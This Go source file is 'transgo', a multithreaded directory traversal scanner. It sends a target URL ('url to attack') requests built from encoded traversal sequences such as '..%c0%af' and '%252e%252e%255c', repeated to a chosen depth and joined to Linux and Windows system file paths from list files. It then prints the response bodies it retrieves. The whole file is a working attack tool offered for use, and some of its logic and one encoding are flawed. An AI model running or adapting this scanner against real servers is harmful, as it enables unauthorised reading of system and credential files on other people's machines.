package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var banner = `
▄▄▄█████▓ ██▀███   ▄▄▄       ███▄    █   ██████   ▄████  ▒█████  
▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒  ██▒ ▀█▒▒██▒  ██▒
▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░▄▄▄░▒██░  ██▒
░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒░▓█  ██▓▒██   ██░
  ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░▒▓███▀▒░ ████▓▒░
  ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ░▒   ▒ ░ ▒░▒░▒░ 
    ░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░   ░   ░ ▒ ▒░ 
  ░        ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░   ░ ░ ░ ░ ▒  
            ░           ░  ░         ░       ░        ░     ░ ░  
                                                                 
`

type trans struct {
	finisher string
	pattern  string
}

var transversalPatterns = []trans{
	trans{finisher: "", pattern: ".."},
	trans{finisher: "/", pattern: "../"},
	trans{finisher: "\\", pattern: "..\\"},
	trans{finisher: "\\", pattern: "%2e%2e\\"},
	trans{finisher: "%2f", pattern: "%2e%2e%2f"},
	trans{finisher: "/", pattern: "%2e%2e/"},
	trans{finisher: "%2f", pattern: "..%2f"},
	trans{finisher: "%5c", pattern: "%2e%2e%5c"},
	trans{finisher: "%5c", pattern: "..%5c"},
	trans{finisher: "%c1%1c", pattern: "..%c1%1c"},
	trans{finisher: "%c0%9v", pattern: "..%c0%9v"},
	trans{finisher: "%c0%af", pattern: "..%c0%af"},
	trans{finisher: "%c1%9c", pattern: "..%c1%9c"},
	trans{finisher: "%255c", pattern: "%252e%252e%255c"},
	trans{finisher: "%255c", pattern: "..%255c"},
}

func fileToLines(filePath string) (lines []string, err error) {

	f, err := os.Open(filePath)
	if err != nil {
		return []string{}, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	err = scanner.Err()
	return lines, err
}

func isValidURL(toTest string) bool {
	_, err := url.ParseRequestURI(toTest)
	if err != nil {
		return false
	}

	u, err := url.Parse(toTest)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return false
	}
	return true
}

func isValidPlatform(platform string) bool {
	switch platform {
	case
		"all",
		"linux",
		"windows":
		return true
	}
	return false
}

func isValidThreads(threads int) bool {
	if threads > 0 {
		return true
	}
	return false
}

func isValidDepth(depth int) bool {
	if depth > 0 {
		return true
	}
	return false
}

func isValidTimeout(timeout int) bool {
	if timeout > 0 {
		return true
	}
	return false
}

type resultSet struct {
	url      string
	response string
}

func getURL(baseURL string, httpClient http.Client, requestURL string, c chan resultSet) {
	resp, err := httpClient.Get(requestURL)
	if err == nil && resp.StatusCode == 200 {
		buf := new(bytes.Buffer)
		buf.ReadFrom(resp.Body)
		body := buf.String()
		result := resultSet{
			url:      baseURL,
			response: body,
		}
		c <- result
	} else {
		result := resultSet{
			url:      baseURL,
			response: "",
		}
		c <- result
	}
}

func processList(url string, urlSublist []string, timeoutSeconds int, c chan resultSet) {
	httpClient := http.Client{Timeout: time.Duration(timeoutSeconds) * time.Second}
	for _, url := range urlSublist {
		getURL(url, httpClient, url, c)
	}
}

func generateUrls(url string, platform string, minDepth int, maxDepth int, windowsFiles []string, linuxFiles []string) []string {
	urlList := []string{}
	filesToTest := []string{}
	filesToTestWindowsFormat := []string{}

	for _, winPath := range windowsFiles {
		newString := strings.Replace(winPath, "/", "\\", -1)
		filesToTestWindowsFormat = append(filesToTestWindowsFormat, newString)
		splittedPath := strings.Split(newString, ":")
		if len(splittedPath) > 0 {
			filePath := splittedPath[1]
			filesToTestWindowsFormat = append(filesToTestWindowsFormat, filePath)
			if strings.HasPrefix(filePath, "/") {
				filePath := strings.TrimLeft(filePath, "\\")
				filesToTestWindowsFormat = append(filesToTestWindowsFormat, filePath)
			}
		}

	}

	if platform == "all" {
		filesToTest = append(linuxFiles, windowsFiles...)
		filesToTest = append(filesToTest, filesToTestWindowsFormat...)
	} else if platform == "windows" {
		filesToTest = windowsFiles
		filesToTest = append(filesToTest, filesToTestWindowsFormat...)
	} else if platform == "linux" {
		filesToTest = linuxFiles
	}

	for _, filePath := range filesToTest {
		for _, ptrn := range transversalPatterns {
			var urlToTest string
			for d := minDepth; d <= maxDepth; d++ {
				urlToTest = url + ptrn.finisher + strings.Repeat(ptrn.pattern, d) + filePath
				urlList = append(urlList, urlToTest)
			}
		}
	}
	return urlList
}

func usage() {
	flag.Usage()
}

func main() {
	fmt.Println(banner)

	windowsFiles, winErr := fileToLines("data/windows.lst")
	if winErr != nil {
		fmt.Printf("[E] Missing 'windows.lst'\n")
		usage()
		os.Exit(1)
	}

	linuxFiles, linErr := fileToLines("data/linux.lst")
	if linErr != nil {
		fmt.Printf("[E] Missing 'linux.lst'\n")
		usage()
		os.Exit(1)
	}

	url := flag.String("u", "", "url to attack")
	searchPatern := flag.String("s", "", "only show results that match with this pattern")
	platform := flag.String("p", "all", "platform to attack (all, linux, windows)")
	threads := flag.Int("t", 10, "number of threads to use")
	minDepth := flag.Int("m", 5, "min directory depth to test")
	maxDepth := flag.Int("d", 15, "max directory depth to test")
	timeout := flag.Int("to", 5, "timeout in seconds for requests")

	flag.Parse()

	if !isValidURL(*url) {
		fmt.Printf("[!] The url you entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !isValidPlatform(*platform) {
		fmt.Printf("[!] The platform u've chosen is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !isValidThreads(*threads) {
		fmt.Printf("[!] The thread count you've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !isValidDepth(*minDepth) {
		fmt.Printf("[!] The min. depth u've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !isValidDepth(*maxDepth) {
		fmt.Printf("[!] max. depth u've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if *minDepth > *maxDepth {
		fmt.Printf("[!] min. depth cannot be bigger than max. depth!\n")
		usage()
		os.Exit(1)
	}

	if !isValidTimeout(*timeout) {
		fmt.Printf("[!] The timeout u've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	var urlList = generateUrls(*url, *platform, *minDepth, *maxDepth, windowsFiles, linuxFiles)
	var sublistSize = (int)(math.Ceil((float64)(len(urlList) / *threads)))
	fmt.Printf("[+] Running transgo with good luck!!\n")
	fmt.Printf("[*] URL: %s\n", *url)
	fmt.Printf("[*] Platform: %s\n", *platform)
	fmt.Printf("[*] Threads: %d\n", *threads)
	fmt.Printf("[*] Min, depth: %d Max, depth: %d\n", *minDepth, *maxDepth)
	fmt.Printf("[*] Request timeout: %d\n\n", *timeout)
	dataChannels := make(chan resultSet, len(urlList))

	for i := 0; i < *threads; i++ {
		var urlSublist = urlList[sublistSize*(i) : sublistSize*(i+1)]
		go func(urlSublist []string) {
			processList(*url, urlSublist, *timeout, dataChannels)
		}(urlSublist)
	}

	dataMap := make(map[string]string)

	for i := 0; i < len(urlList); i++ {
		body := <-dataChannels
		if strings.Contains(body.response, *searchPatern) {
			_, found := dataMap[body.response]
			if found == false {
				// TODO: save and print the filename that was requested and check if is another url
				dataMap[body.response] = body.url
				fmt.Println(body.response)
			}
		}
	}

}
